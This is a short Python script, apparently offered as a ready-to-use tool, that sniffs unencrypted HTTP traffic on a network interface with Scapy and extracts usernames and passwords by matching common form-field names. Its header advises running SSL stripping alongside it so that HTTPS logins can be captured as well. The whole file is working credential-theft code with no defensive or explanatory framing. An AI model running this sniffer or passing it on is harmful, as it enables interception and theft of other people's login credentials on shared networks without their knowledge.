###########################################
# Script Name : Password Sniffer (HTTP)
# Description : This script is a simple password sniffer that captures login credentials sent over HTTP. 
#It listens on a specified network interface and extracts usernames and passwords from HTTP traffic.
#Note: This only works for HTTP traffic. For HTTPS, SSL stripping is required, and it will not work for TLS encryption. Must run SSL Striping alongside script.
###########################################

# Import necessary libraries
from scapy.all import *  # Scapy for packet sniffing
from urllib import parse  # For URL decoding
import re  # Regular expressions for pattern matching

# Define network interface to sniff on
iface = "eth0"

# Function to extract login credentials from packet payload
def get_login_pass(body):
    user = None
    passwd = None

    # Common username and password field names found in HTTP traffic
    userfields = ['log', 'login', 'wpname']
    passfields = ['ahd_password', 'pass']

    # Search for username fields
    for login in userfields:
        login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
        if login_re:
            user = login_re.group()

    # Search for password fields
    for passfield in passfields:
        pass_re = re.search('(%s=[^&]+)' % passfield, body, re.IGNORECASE)  # Fixed variable name 'passfield'
        if pass_re:
            passwd = pass_re.group()

    # Return extracted credentials if both username and password are found
    if user and passwd:
        return(user, passwd)

# Function to process captured packets
def pkt_parser(packet):
    # Check if packet contains TCP, Raw payload, and IP layer
    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
        body = str(packet[TCP].payload)
        user_pass = get_login_pass(body)
        if user_pass is not None:
            print(packet[TCP].payload)  # Print raw payload
            print(parse.unquote(user_pass[0]))  # Decode and print username
            print(parse.unquote(user_pass[1]))  # Decode and print password

# Start packet sniffing
try:
    sniff(iface=iface, prn=pkt_parser, store=0)  # Listen on the specified interface
except KeyboardInterrupt:
    print('Exiting')
    exit(0)
